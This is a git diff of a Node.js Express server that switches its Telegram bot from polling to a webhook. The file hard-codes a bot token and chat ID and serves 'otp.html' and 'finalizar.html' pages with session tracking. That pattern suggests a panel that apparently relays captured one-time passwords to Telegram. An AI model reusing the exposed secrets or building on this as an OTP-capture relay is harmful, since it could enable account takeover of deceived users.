@@ -9,6 +9,7 @@ const cors = require('cors');
 const PORT = process.env.PORT || 3000;
 const TELEGRAM_BOT_TOKEN = '8202936126:AAGKUwgllbE3FoEJqZWdjGYACO46h-E-Mxk';
 const TELEGRAM_CHAT_ID = '-5068158422';
+const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://3bab.onrender.com';
 
 // Inicializar Express y Socket.IO
 const app = express();
@@ -25,8 +26,19 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// Inicializar Bot de Telegram
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+// Inicializar Bot de Telegram con webhook en producción, polling en desarrollo
+const isProduction = process.env.NODE_ENV === 'production';
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
+    polling: !isProduction,
+    webHook: isProduction ? { port: PORT } : false
+});
+
+// Configurar webhook en producción
+if (isProduction) {
+    const webhookPath = `/webhook/${TELEGRAM_BOT_TOKEN}`;
+    bot.setWebHook(`${WEBHOOK_URL}${webhookPath}`);
+    console.log(`🔗 Webhook configurado: ${WEBHOOK_URL}${webhookPath}`);
+}
 
 // Almacenar sesiones activas
 const activeSessions = new Map();
@@ -50,6 +62,12 @@ app.get('/otp.html', (req, res) => {
 
 app.get('/finalizar.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'finalizar.html'));
+});
+
+// Webhook endpoint para Telegram
+app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
 });
 
 // Socket.IO - Manejo de conexiones
